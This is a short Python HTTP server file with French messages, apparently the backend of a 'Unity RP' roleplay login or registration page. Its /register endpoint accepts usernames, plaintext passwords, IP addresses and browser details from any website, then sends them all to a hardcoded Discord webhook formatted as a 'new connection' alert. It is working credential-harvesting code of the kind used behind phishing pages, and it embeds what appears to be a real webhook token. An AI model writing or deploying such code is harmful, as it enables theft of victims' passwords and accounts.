
from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import datetime
import urllib.request
import os

WEBHOOK_URL = "https://discord.com/api/webhooks/1536029607050870957/v2lW072iaQP_hprGmBLGJ2U_FrmrVWd-4zum6_KeiL8rZ1fBquBZYQvozIlS0HA3eva0"

class UnityRPHandler(SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS, GET')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

    def do_POST(self):
        if self.path == '/register':
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode('utf-8'))

                now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                username = data.get('username', 'Inconnu')
                password = data.get('password', 'Inconnu')
                ip_addr = data.get('ip', 'Non spécifiée')
                user_agent = data.get('userAgent', 'Non spécifié')

                print(f"[EXPERT] Données reçues pour : {username}")

                msg = (
                    f"🚨 **NOUVELLE CONNEXION UNITY RP** [{now}] 🚨\n"
                    f"👤 **Utilisateur :** {username}\n"
                    f"🔑 **Mot de passe :** {password}\n"
                    f"🌐 **Adresse IP :** {ip_addr}\n"
                    f"💻 **Navigateur :** {user_agent}"
                )

                payload = json.dumps({"content": msg}).encode('utf-8')
                req = urllib.request.Request(
                    WEBHOOK_URL, 
                    data=payload, 
                    headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
                )

                urllib.request.urlopen(req)

                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))

            except Exception as e:
                print(f"[ERREUR SERVEUR] {e}")
                self.send_response(500)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode('utf-8'))
        else:
            self.send_error(404, "Page non trouvée")

if __name__ == '__main__':
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    port = int(os.environ.get("PORT", 10000))
    server_address = ('', port)
    httpd = HTTPServer(server_address, UnityRPHandler)
    print(f"Serveur Python démarré sur le port {port}")
    httpd.serve_forever()
